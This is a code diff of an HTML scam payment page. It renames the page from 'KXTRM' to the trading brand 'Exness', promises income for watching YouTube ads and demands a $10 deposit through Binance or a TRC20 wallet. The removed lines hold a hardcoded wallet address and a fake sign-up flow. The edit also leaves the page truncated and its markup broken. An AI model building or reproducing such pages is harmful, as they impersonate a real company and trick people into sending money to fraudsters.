@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>KXTRM - الدفع والاشتراك</title>
+<title>Exness</title>
 <link rel="preconnect" href="https://googleapis.com">
 <link rel="preconnect" href="https://gstatic.com" crossorigin>
 <link href="https://googleapis.com" rel="stylesheet">
@@ -170,7 +170,7 @@ input[type="text"]::placeholder { color:#7f8c8d !important; opacity:1; }
 </div>
 
 <div class="card">
-<div class="brand">KXTRM</div>
+<div class="brand">Exness</div>
 
 <form id="paymentForm" onsubmit="return false;">
 <div id="step1">
@@ -187,7 +187,7 @@ input[type="text"]::placeholder { color:#7f8c8d !important; opacity:1; }
 <button type="button" onclick="goToStep2()" class="submit-btn-pulse">CREATE ACCOUNT</button>
 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
 <div class="footer-info-box">
-<div class="brand-line"><span>🌐 KXTRM 🟢</span></div>
+<div class="brand-line"><span>🌐 Exness 🟢</span></div>
 <p>A PLATFORM TO PROVIDE COMPREHENSIVE SUPPORT<br>WHEN WATCHING YOUTUBE ADS</p>
 <p>YOU WILL RECEIVE THE MONEY THROUGH YOUR ACCOUNT</p>
 <p class="highlight-red">PLEASE DEPOSIT $10. GO TO PAGE.</p>
@@ -201,46 +201,5 @@ input[type="text"]::placeholder { color:#7f8c8d !important; opacity:1; }
 <a href="https://binance.com" target="_blank" class="binance-btn-final">⚡ الدفع عبر بايننس طلب دفع</a>
 <div class="manual-deposit-box">
 <p style="font-size: 14px; margin-bottom: 10px; color: #ffffff; font-weight: 700; direction: ltr; text-align: center;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
-<div id="cryptoAddress" class="crypto-address-container">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
-<button onclick="copyWalletAddress()" type="button" class="copy-btn-style">نسخ عنوان المحفظة</button>
-</div>
-</div>
-</form>
-</div>
-
-<script>
-function goToStep2() {
-    var nameVal = document.getElementById('displayname').value.trim();
-    var emailVal = document.getElementById('username').value.trim();
+<div id="cryptoAddress">
     
-    if(nameVal === "" || emailVal === "") {
-        alert("يرجى ملء الحقول المطلوبة أولاً.");
-        return;
-    }
-    
-    var alertOverlay = document.getElementById('successAlert');
-    alertOverlay.style.display = 'flex';
-    
-    setTimeout(function() {
-        alertOverlay.style.display = 'none';
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('step2').style.display = 'block';
-    }, 2000);
-}
-
-function alertNoAccount() {
-    alert("لا يوجد حساب مسجل بهذا الاسم حالياً، يرجى إنشاء حساب جديد.");
-}
-
-function copyWalletAddress() {
-    var addressText = document.getElementById('cryptoAddress').innerText;
-    navigator.clipboard.writeText(addressText).then(function() {
-        alert("تم نسخ عنوان المحفظة بنجاح!");
-    }).catch(function() {
-        alert("فشل النسخ التلقائي، يرجى تحديده ونسخه يدوياً.");
-    });
-}
-</script>
-
-</body>
-</html>
